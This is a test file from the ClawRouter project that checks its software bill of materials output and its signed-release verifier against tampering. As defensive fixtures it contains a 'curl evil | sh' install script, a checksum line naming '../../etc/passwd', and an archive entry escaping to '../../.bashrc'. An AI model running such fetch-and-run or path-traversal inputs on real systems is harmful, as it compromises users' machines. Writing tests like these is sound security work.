/*
 * ClawRouter - Self-hosted AI gateway and control platform
 * https://github.com/iant89/ClawRouter
 *
 * Copyright (C) 2026 Ian Thomas
 * SPDX-License-Identifier: AGPL-3.0-or-later
 *
 * This program is free software: you can redistribute it and/or modify it under
 * the terms of the GNU Affero General Public License as published by the Free
 * Software Foundation, either version 3 of the License, or (at your option) any
 * later version. This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Affero General Public License
 * in the LICENSE file for more details.
 */

// SEC-019, SEC-020: the SBOMs describe what ships, and a release that was changed, re-signed,
// left unsigned or built to escape its folder never verifies.

import { afterEach, describe, expect, test } from 'bun:test';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { readLockfile } from '../../../scripts/supply-chain/lockfile.ts';
import {
  artifactNames, checksumFile, createArchive, generateSigningKey, listArchive, loadPrivateKey, signBytes,
  verifyRelease, CHECKSUMS, SIGNATURE, type ArchiveEntry,
} from '../../../scripts/supply-chain/release.ts';
import { components, cycloneDx, sbomInput, spdx } from '../../../scripts/supply-chain/sbom.ts';

const ROOT = resolve(import.meta.dir, '../../..');
const COMMIT = '0123456789abcdef0123456789abcdef01234567';
const input = () => sbomInput(ROOT, readLockfile(ROOT), COMMIT, 1_790_000_000);

describe('software bill of materials (SEC-019)', () => {
  test('runtime and development dependencies are told apart', () => {
    const comps = components(input());
    const scope = Object.fromEntries(comps.map((c) => [c.name, c.scope]));
    for (const name of ['react', 'react-dom', 'scheduler', 'lucide-react', '@enterprise-ui/react']) expect([name, scope[name]]).toEqual([name, 'runtime']);
    for (const name of ['typescript', '@types/bun', '@types/react', 'bun-types']) expect([name, scope[name]]).toEqual([name, 'development']);
  });

  test('every locked package is listed with its version, hash and license', () => {
    const lock = readLockfile(ROOT);
    const comps = components(input());
    const third = lock.packages.filter((p) => p.source.kind !== 'workspace');
    expect(comps).toHaveLength(third.length);
    for (const p of third) {
      const c = comps.find((x) => x.key === p.key)!;
      expect(c.version).toMatch(/^\d+\.\d+\.\d+/);
      if (p.version) expect(c.version).toBe(p.version);
      expect(c.sha512).toBe(Buffer.from(p.integrity!.slice(7), 'base64').toString('hex'));
      expect(c.license).toBeTruthy();
    }
  });

  test('both formats name the application, its version and the runtime', () => {
    const i = input();
    const version = (JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8')) as { version: string }).version;
    const cdx = cycloneDx(i) as any;
    expect(cdx.bomFormat).toBe('CycloneDX');
    expect(cdx.specVersion).toBe('1.6');
    expect(cdx.metadata.component).toMatchObject({ name: 'clawrouter', version, licenses: [{ license: { id: 'AGPL-3.0-or-later' } }] });
    const bun = cdx.components.find((c: any) => c.name === 'bun' && !c.group);
    expect(bun).toMatchObject({ type: 'platform', version: Bun.version, scope: 'required' });
    expect(bun.components[0].name).toBe('sqlite');
    expect(cdx.dependencies[0].dependsOn).toContain(`pkg:github/oven-sh/bun@bun-v${Bun.version}`);
    expect(cdx.dependencies[0].dependsOn).toContain('pkg:npm/react@19.3.1');

    const doc = spdx(i) as any;
    expect(doc.spdxVersion).toBe('SPDX-2.3');
    expect(doc.packages[0]).toMatchObject({ name: 'clawrouter', versionInfo: version, licenseDeclared: 'AGPL-3.0-or-later' });
    const rel = (type: string, related: string) => doc.relationships.some((r: any) => r.relationshipType === type && r.relatedSpdxElement === related);
    expect(rel('RUNTIME_DEPENDENCY_OF', 'SPDXRef-Package-clawrouter')).toBe(true);
    expect(rel('DEV_DEPENDENCY_OF', 'SPDXRef-Package-clawrouter')).toBe(true);
    // Every relationship points at a package in the document.
    const ids = new Set([...doc.packages.map((p: any) => p.SPDXID), 'SPDXRef-DOCUMENT']);
    for (const r of doc.relationships) expect([r.spdxElementId, r.relatedSpdxElement].every((x: string) => ids.has(x))).toBe(true);
  });

  test('the same commit gives the same SBOM', () => {
    expect(JSON.stringify(cycloneDx(input()))).toBe(JSON.stringify(cycloneDx(input())));
    expect(JSON.stringify(spdx(input()))).toBe(JSON.stringify(spdx(input())));
  });
});

// A release folder like `bun run release` writes, around a small archive.
const dirs: string[] = [];
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});
const file = (path: string, text: string): ArchiveEntry => ({ path, data: new TextEncoder().encode(text), executable: false });
const BASE = ['dist/main.js', 'LICENSE', 'BUILD-INFO.json'].map((p) => file(`clawrouter-9.9.9/${p}`, `contents of ${p}`));

function release(options: { entries?: ArchiveEntry[]; archive?: Uint8Array; sbomVersion?: string } = {}) {
  const dir = mkdtempSync(join(tmpdir(), 'clawrouter-release-'));
  dirs.push(dir);
  const names = artifactNames('9.9.9');
  writeFileSync(join(dir, names.archive), options.archive ?? createArchive(options.entries ?? BASE, 1_790_000_000));
  const v = options.sbomVersion ?? '9.9.9';
  writeFileSync(join(dir, names.spdx), JSON.stringify({ packages: [{ name: 'clawrouter', versionInfo: v }] }));
  writeFileSync(join(dir, names.cyclonedx), JSON.stringify({ metadata: { component: { version: v } } }));
  const key = generateSigningKey();
  const sums = checksumFile(dir, Object.values(names));
  writeFileSync(join(dir, CHECKSUMS), sums);
  writeFileSync(join(dir, SIGNATURE), signBytes(new TextEncoder().encode(sums), loadPrivateKey(key.privateKey)));
  return { dir, key, names };
}
const failure = (dir: string, publicKey: string, extra: object = {}) => {
  try {
    verifyRelease(dir, { publicKey, ...extra });
    return '';
  } catch (e) {
    return (e as Error).message;
  }
};

describe('signed releases (SEC-020)', () => {
  test('a genuine release verifies', () => {
    const { dir, key } = release();
    expect(verifyRelease(dir, { publicKey: key.publicKey, expectVersion: '9.9.9' })).toEqual({
      version: '9.9.9', signed: true, files: ['clawrouter-9.9.9.cdx.json', 'clawrouter-9.9.9.spdx.json', 'clawrouter-9.9.9.tar.gz'],
    });
  });

  test('a changed file', () => {
    const { dir, key, names } = release();
    writeFileSync(join(dir, names.archive), createArchive([...BASE, file('clawrouter-9.9.9/dist/backdoor.js', 'x')], 1_790_000_000));
    expect(failure(dir, key.publicKey)).toContain('clawrouter-9.9.9.tar.gz does not match its SHA-256');
  });

  test('changed checksums no longer match the signature', () => {
    const { dir, key, names } = release();
    writeFileSync(join(dir, names.archive), createArchive([...BASE, file('clawrouter-9.9.9/dist/backdoor.js', 'x')], 1_790_000_000));
    writeFileSync(join(dir, CHECKSUMS), checksumFile(dir, Object.values(names)));
    expect(failure(dir, key.publicKey)).toContain('SHA256SUMS.sig does not match');
  });

  test('re-signed with another key', () => {
    const { dir } = release();
    expect(failure(dir, generateSigningKey().publicKey)).toContain('signed by someone else');
  });

  test('not signed', () => {
    const { dir, key } = release();
    rmSync(join(dir, SIGNATURE));
    expect(failure(dir, key.publicKey)).toContain('the release is not signed');
    expect(verifyRelease(dir, { allowUnsigned: true }).signed).toBe(false);
  });

  test('a garbage signature', () => {
    const { dir, key } = release();
    writeFileSync(join(dir, SIGNATURE), 'not a signature');
    expect(failure(dir, key.publicKey)).toContain('SHA256SUMS.sig does not match');
  });

  test('an extra or missing file', () => {
    const extra = release();
    writeFileSync(join(extra.dir, 'install.sh'), 'curl evil | sh');
    expect(failure(extra.dir, extra.key.publicKey)).toContain('install.sh is not listed in SHA256SUMS');
    const missing = release();
    rmSync(join(missing.dir, missing.names.spdx));
    expect(failure(missing.dir, missing.key.publicKey)).toContain('clawrouter-9.9.9.spdx.json is listed in SHA256SUMS but missing');
  });

  test('another version than expected, or SBOMs for another version', () => {
    const { dir, key } = release();
    expect(failure(dir, key.publicKey, { expectVersion: '9.9.10' })).toContain('expected 9.9.10');
    const other = release({ sbomVersion: '1.0.0' });
    expect(failure(other.dir, other.key.publicKey)).toContain('describes version 1.0.0, not 9.9.9');
  });

  test('a checksum file that names paths', () => {
    const { dir, key } = release();
    writeFileSync(join(dir, CHECKSUMS), `${'0'.repeat(64)}  ../../etc/passwd\n`);
    expect(failure(dir, key.publicKey)).toContain('unreadable line');
  });

  test('an archive that writes outside its folder', () => {
    const { dir, key } = release({ entries: [...BASE, file('clawrouter-9.9.9/../../.bashrc', 'evil')] });
    expect(failure(dir, key.publicKey)).toContain('archive entry outside clawrouter-9.9.9/');
  });

  test('an archive with a link', () => {
    // Turn one regular file into a symbolic link (type "2") and fix the header checksum.
    const tar = Bun.gunzipSync(createArchive(BASE, 1_790_000_000));
    const at = (() => {
      for (let o = 0; o < tar.length; o += 512) if (new TextDecoder().decode(tar.subarray(o, o + 100)).startsWith('clawrouter-9.9.9/LICENSE')) return o;
      throw new Error('entry not found');
    })();
    tar[at + 156] = '2'.charCodeAt(0);
    tar.fill(0x20, at + 148, at + 156);
    let sum = 0;
    for (const b of tar.subarray(at, at + 512)) sum += b;
    tar.set(new TextEncoder().encode(`${sum.toString(8).padStart(6, '0')}\0 `), at + 148);
    const { dir, key } = release({ archive: Bun.gzipSync(tar) });
    expect(failure(dir, key.publicKey)).toContain('not a plain file or folder: clawrouter-9.9.9/LICENSE');
  });

  test('archives are reproducible and readable by tar', () => {
    const a = createArchive(BASE, 1_790_000_000);
    expect(Buffer.from(createArchive([...BASE].reverse(), 1_790_000_000)).equals(Buffer.from(a))).toBe(true);
    expect(listArchive(a).map((e) => e.path)).toEqual([
      'clawrouter-9.9.9/', 'clawrouter-9.9.9/BUILD-INFO.json', 'clawrouter-9.9.9/LICENSE', 'clawrouter-9.9.9/dist/', 'clawrouter-9.9.9/dist/main.js',
    ]);
    const { dir, names } = release();
    const tar = Bun.spawnSync(['tar', '-tzf', join(dir, names.archive)], { stdout: 'pipe' });
    if (tar.exitCode !== null && tar.stdout.length) expect(tar.stdout.toString().split('\n').filter(Boolean)).toContain('clawrouter-9.9.9/dist/main.js');
  });

  test('long paths use the ustar prefix', () => {
    const deep = `clawrouter-9.9.9/dist/${'a'.repeat(60)}/${'b'.repeat(60)}/file.js`;
    expect(listArchive(createArchive([file(deep, 'x')], 0)).at(-1)!.path).toBe(deep);
  });
});
